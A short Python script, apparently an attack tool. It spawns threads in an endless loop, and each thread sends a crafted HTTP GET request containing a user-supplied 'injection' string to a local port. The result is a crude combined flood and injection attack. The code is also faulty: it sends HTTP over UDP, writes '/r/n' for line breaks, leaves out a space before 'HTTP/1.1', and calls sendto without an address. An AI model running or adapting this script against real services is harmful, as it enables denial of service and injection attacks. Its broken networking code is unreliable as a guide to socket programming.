import socket
import sys
import threading

print("Attacking " + sys.argv[1])
print("Injecting " + sys.argv[2])
class ConnectionThread(threading.Thread):
    def run(self):
        s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.connect(('127.0.0.1',9999))
        print(">>GET / "+sys.argv[2] + "HTTP/1.1")
        message = b'GET /'+str.encode(sys.argv[2]) + b'HTTP/1.1\r\n'
        addr = b'HOST: ' + str.encode(sys.argv[1]) + b'/r/n/r/n'
        s.sendto(message,('127.0.0.1', 9999))
        print(s.recv(1024).decode('utf-8'))
        s.sendto(addr)
        print(s.recv(1024).decode('utf-8'))
        s.close()

while(1):
    ConnectionThread().start()